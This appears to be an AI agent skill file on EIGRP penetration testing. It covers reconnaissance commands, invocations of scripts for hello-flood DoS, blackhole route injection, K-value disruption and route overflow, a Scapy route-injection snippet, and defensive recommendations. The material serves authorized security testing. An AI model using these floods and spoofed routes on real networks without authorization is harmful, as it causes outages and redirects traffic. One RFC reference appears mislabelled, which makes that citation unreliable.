---
name: eigrp-pentest
description: EIGRP network protocol pentesting and attack methodology. Use this skill whenever the user needs to test EIGRP routing security, perform reconnaissance on EIGRP networks, craft EIGRP packets for route injection, or understand EIGRP attack vectors. Trigger for EIGRP vulnerability assessment, routing protocol security testing, network penetration testing involving Cisco routing protocols, or when analyzing EIGRP traffic for security issues.
---

# EIGRP Pentesting Skill

A comprehensive skill for EIGRP (Enhanced Interior Gateway Routing Protocol) security testing and attack methodology. This skill guides you through reconnaissance, packet crafting, and various EIGRP attack vectors.

## ⚠️ Authorization Required

**Only use these techniques on networks you own or have explicit written authorization to test.** Unauthorized EIGRP manipulation can cause network outages and is illegal.

## When to Use This Skill

- EIGRP network security assessments
- Routing protocol vulnerability testing
- Network penetration testing involving Cisco infrastructure
- EIGRP traffic analysis and forensics
- Learning EIGRP protocol internals for defensive purposes

## Attack Vectors Overview

| Attack | Objective | Script |
|--------|-----------|--------|
| Fake Neighbor | CPU overload via hello flood | `eigrp_hello_flood.py` |
| Blackhole | Traffic disruption via false routes | `eigrp_route_inject.py` |
| K-Value Abuse | Adjacency disruption | `eigrp_kvalue_attack.py` |
| Route Overflow | CPU/RAM exhaustion | `eigrp_route_overflow.py` |

## Methodology

### Phase 1: Passive Reconnaissance

Before any active testing, gather intelligence passively:

```bash
# Sniff EIGRP traffic (IP protocol 88)
sudo tcpdump -ni <interface> 'ip proto 88 or ip6 proto 88' -w eigrp_capture.pcap

# Nmap discovery (requires network access)
sudo nmap --script broadcast-eigrp-discovery -p 88/udp <target>
sudo nmap --script broadcast-eigrp-discovery --script-args broadcast-eigrp-discovery.as=100 <target>
```

**Extract from captures:**
- AS number (autonomous system)
- K-values and Hold Time from PARAMETER TLV
- Authentication type: none, MD5, or HMAC-SHA-256
- Neighbor source addresses
- Active subnets and interfaces

### Phase 2: Authentication Assessment

Determine if route injection is feasible:

- **No authentication**: Blind spoofing possible
- **MD5 authentication**: Requires key material
- **HMAC-SHA-256**: Modern named mode, requires key material

Check for authentication in captured HELLO/UPDATE packets using the AUTH TLV.

### Phase 3: Active Testing

Choose attack vector based on objectives:

#### Fake Neighbor Attack (DoS)
Overload router CPUs with EIGRP hello packets:

```bash
python3 scripts/eigrp_hello_flood.py --interface eth0 --as 1 --subnet 10.10.100.0/24
```

#### Blackhole Attack (Traffic Disruption)
Inject false routes to redirect traffic:

```bash
python3 scripts/eigrp_route_inject.py --interface eth0 --as 1 --src 10.10.100.50 --dst 172.16.100.140 --prefix 32
```

#### K-Value Attack (Adjacency Disruption)
Create continuous neighbor flapping:

```bash
python3 scripts/eigrp_kvalue_attack.py --interface eth0 --as 1 --src 10.10.100.100
```

#### Route Overflow Attack (Resource Exhaustion)
Flood routing table with false routes:

```bash
python3 scripts/eigrp_route_overflow.py --interface eth0 --as 1 --src 10.10.100.50
```

### Phase 4: IPv6 Considerations

EIGRP for IPv6 uses:
- Multicast: `FF02::A`
- Per-interface configuration
- Same TLV structure as IPv4

For IPv6 route injection, use the `--ipv6` flag with route injection scripts.

## Protocol Details

### EIGRP Packet Types
- **HELLO**: Neighbor discovery, carries K-values
- **UPDATE**: Route advertisements
- **ACK**: Acknowledgements
- **QUERY/REPLY**: Route queries

### Key TLVs
- **PARAMETER (0x0001)**: K-values, Hold Time
- **SEQUENCE**: Sequence/acknowledgement tracking
- **AUTH**: Authentication data (MD5/SHA-256)
- **EIGRPIntRoute**: IPv4 route entries
- **EIGRPv6IntRoute**: IPv6 route entries

### Important Addresses
- **IPv4 multicast**: `224.0.0.10`
- **IPv6 multicast**: `FF02::A`
- **IP Protocol**: `88`

## Scapy Integration

For custom packet crafting, Scapy's EIGRP contrib layer provides:

```python
from scapy.all import *
load_contrib("eigrp")

# Basic route injection
sendp(Ether()/IP(src="192.168.1.248", dst="224.0.0.10") /
      EIGRP(opcode="Update", asn=100, seq=0, ack=0,
            tlvlist=[EIGRPIntRoute(dst="192.168.100.0",
                                   nexthop="192.168.1.248")]))
```

## Defensive Recommendations

After testing, recommend:

1. **Enable authentication**: HMAC-SHA-256 preferred
2. **Filter EIGRP neighbors**: Use `neighbor` statements with ACLs
3. **Monitor for anomalies**: Unexpected route changes, CPU spikes
4. **Segment networks**: Limit EIGRP broadcast domains
5. **Use EIGRP named mode**: Better security features

## References

- RFC 7868: EIGRP for IPv6
- Nmap broadcast-eigrp-discovery script
- Scapy EIGRP contrib: https://scapy.readthedocs.io/en/latest/api/scapy.contrib.eigrp.html
- Routopsy: https://sensepost.com/blog/2020/routopsy-hacking-routing-with-routers/

## Bundled Scripts

See `scripts/` directory for:
- `eigrp_hello_flood.py` - Hello packet flooding
- `eigrp_route_inject.py` - Route injection
- `eigrp_kvalue_attack.py` - K-value manipulation
- `eigrp_route_overflow.py` - Routing table overflow
- `eigrp_recon.py` - Passive reconnaissance
